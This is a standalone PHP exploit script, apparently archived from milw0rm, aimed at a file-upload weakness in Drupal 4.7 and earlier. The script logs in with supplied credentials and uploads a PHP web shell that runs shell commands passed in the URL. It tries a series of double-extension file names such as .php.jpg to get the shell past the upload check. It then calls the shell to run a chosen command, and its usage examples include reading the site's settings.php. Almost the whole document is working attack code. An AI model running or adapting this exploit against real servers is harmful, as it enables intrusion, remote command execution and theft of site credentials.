#!/usr/bin/php -q -d short_open_tag=on
<?
echo "Drupal <= 4.7 attachment mod_mime poc exploit\r\n";
echo "by rgod rgod@autistici.org\r\n";
echo "site: http://retrogod.altervista.org\r\n\r\n";

/*
this works with a user account with upload rights and with permissions to modify
stories, however this is only a poc, you can do the same uploading an attachment,
like this, with double extension, through all modules:

attach.php.pps

with this content:
*/

$shell=
'<?php
if (get_magic_quotes_gpc()){$_GET[cmd]=stripslashes($_GET[cmd]);}
ini_set("max_execution_time",0);
echo chr(0x2A).chr(0x64).chr(0x65).chr(0x6C).chr(0x69).chr(0x2A);
passthru($_GET[cmd]);
echo chr(0x2A).chr(0x64).chr(0x65).chr(0x6C).chr(0x69).chr(0x2A);
?>';

/*
then:

http://[target]/[path]/files/attach.php.pps?cmd=ls%20-la

also, I noticed that from an admin account you can upload .php3 or .php5 files
*/

if ($argc<6) {
echo "Usage: php ".$argv[0]." host path user pass cmd OPTIONS\r\n";
echo "host:      target server (ip/hostname)\r\n";
echo "path:      path to Drupal\r\n";
echo "user-pass: valid credentials with upload rights\r\n";
echo "cmd:       a shell command\r\n";
echo "Options:\r\n";
echo "   -p[port]:    specify a port other than 80\r\n";
echo "   -P[ip:port]: specify a proxy\r\n";
echo "Examples:\r\n";
echo "php ".$argv[0]." localhost /drupal/ user password cat ./../sites/default/settings.php\r\n";
echo "php ".$argv[0]." localhost /drupal/ user password ls -la -p81\r\n";
echo "php ".$argv[0]." localhost / user password ls -la -P1.1.1.1:80\r\n";
die;
}

ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}

function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$argv[1];
$path=$argv[2];
$user=$argv[3];
$pass=$argv[4];
$cmd="";$port=80;$proxy="";

for ($i=5; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P"))
{$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
$cmd=urlencode($cmd);
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

srand(make_seed());
$anumber = rand(1,99999);

  $data ="edit%5Bname%5D=".$user;
  $data.="&edit%5Bpass%5D=".$pass;
  $data.="&edit%5Bform_id%5D=user_login";
  $data.="&op=Log%20in";
  $packet="POST ".$path."?q=user/login&destination=node HTTP/1.0\r\n";
  $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
  $packet.="Accept-Encoding: gzip, deflate\r\n";
  $packet.="Accept-Language: it\r\n";
  $packet.="Referer: http://".$host.$path."\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Content-Length: ".strlen($data)."\r\n";
  $packet.="Cache-Control: no-cache\r\n";
  $packet.="Connection: close\r\n\r\n";
  $packet.=$data;
// echo quick_dump($packet);
  sendpacketii($packet);
  $temp=explode("Set-Cookie: ",$html);
  $temp2=explode(" ",$temp[2]);
  $cookie=$temp2[0];
  echo "\r\nCookie -> ".$cookie."\r\n\r\n";


$ext= array(".php.jpg",".php.jpeg",".php.gif", ".php.png",".php.txt",".php.html",".php.doc",".php.xls",".php.pdf",".php.ppt",".php.pps");

for ($x=0; $x<=count($ext)-1;$x++)
{
echo "Trying with ".$ext[$x]." extension...\r\n";
$d=date("Y-m-d");
$data='-----------------------------7d6381c1b00a2
Content-Disposition: form-data; name="edit[title]"

titolo
-----------------------------7d6381c1b00a2
Content-Disposition: form-data; name="edit[body]"

corpo
-----------------------------7d6381c1b00a2
Content-Disposition: form-data; name="edit[format]"

1
-----------------------------7d6381c1b00a2
Content-Disposition: form-data; name="edit[form_id]"

story_node_form
-----------------------------7d6381c1b00a2
Content-Disposition: form-data; name="edit[name]"

'.$user.'
-----------------------------7d6381c1b00a2
Content-Disposition: form-data; name="edit[date]"

'.$d.' 23:59:59 +0000
-----------------------------7d6381c1b00a2
Content-Disposition: form-data; name="edit[status]"

1
-----------------------------7d6381c1b00a2
Content-Disposition: form-data; name="edit[promote]"

1
-----------------------------7d6381c1b00a2
Content-Disposition: form-data; name="edit[comment]"

2
-----------------------------7d6381c1b00a2
Content-Disposition: form-data; name="edit[path]"


-----------------------------7d6381c1b00a2
Content-Disposition: form-data; name="edit[menu][title]"


-----------------------------7d6381c1b00a2
Content-Disposition: form-data; name="edit[menu][description]"


-----------------------------7d6381c1b00a2
Content-Disposition: form-data; name="edit[menu][pid]"

1
-----------------------------7d6381c1b00a2
Content-Disposition: form-data; name="edit[menu][path]"


-----------------------------7d6381c1b00a2
Content-Disposition: form-data; name="edit[menu][weight]"

0
-----------------------------7d6381c1b00a2
Content-Disposition: form-data; name="edit[menu][mid]"

0
-----------------------------7d6381c1b00a2
Content-Disposition: form-data; name="edit[menu][type]"

86
-----------------------------7d6381c1b00a2
Content-Disposition: form-data; name="edit[upload]"; filename="suntzu'.$anumber.$ext[$x].'"
Content-Type: image/jpeg

'.$shell.'
-----------------------------7d6381c1b00a2
Content-Disposition: form-data; name="fileop"

Attach
-----------------------------7d6381c1b00a2
Content-Disposition: form-data; name="edit[fileop]"

http://'.$host.$path.'?q=upload/js
-----------------------------7d6381c1b00a2
Content-Disposition: form-data; name="edit[vid]"


-----------------------------7d6381c1b00a2--
';

$packet="POST ".$p."?q=upload/js HTTP/1.0\r\n";
$packet.="Referer: http://".$host.$path."/?q=node/add/story\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6381c1b00a2\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Cache-Control: no-cache\r\n";
$packet.="Cookie: ".$cookie."\r\n";
$packet.="Connection: Keep-Alive\r\n\r\n";
$packet.=$data;
//echo quick_dump($packet);
sendpacketii($packet);

$data='-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="edit[title]"

titolo
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="edit[body]"

corpo
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="edit[format]"

1
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="edit[form_id]"

story_node_form
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="edit[name]"

'.$user.'
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="edit[date]"

'.$d.' 23:59:59 +0000
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="edit[status]"

1
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="edit[promote]"

1
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="edit[comment]"

2
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="edit[path]"


-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="edit[menu][title]"


-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="edit[menu][description]"


-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="edit[menu][pid]"

1
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="edit[menu][path]"


-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="edit[menu][weight]"

0
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="edit[menu][mid]"

0
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="edit[menu][type]"

86
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="edit[files][upload_0][list]"

1
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="edit[files][upload_0][description]"

hello.txt
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="edit[upload]"; filename=""
Content-Type: image/jpeg


-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="edit[fileop]"

http://'.$host.$path.'?q=upload/js
-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="edit[vid]"


-----------------------------7d6318101b00a2
Content-Disposition: form-data; name="op"

Submit
-----------------------------7d6318101b00a2--
';

$packet="POST ".$p."?q=node/add/story HTTP/1.0\r\n";
$packet.="Referer: http://".$host.$path."/?q=node/add/story\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6318101b00a2\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cache-Control: no-cache\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Cookie: ".$cookie."\r\n";
$packet.="Connection: Keep-Alive\r\n\r\n";
$packet.=$data;
//echo quick_dump($packet);
sendpacketii($packet);

$packet ="GET ".$p."files/suntzu".$anumber.$ext[$x]."?cmd=".$cmd." HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
//echo quick_dump($packet);
sendpacketii($packet);
if (strstr($html,"*deli*"))
{echo "Exploit succeeded...\r\n";
 $temp=explode("*deli*",$html);
 die($temp[1]);
}
}
//if you are here...
echo "Exploit failed...";
?>

# milw0rm.com [2006-05-24]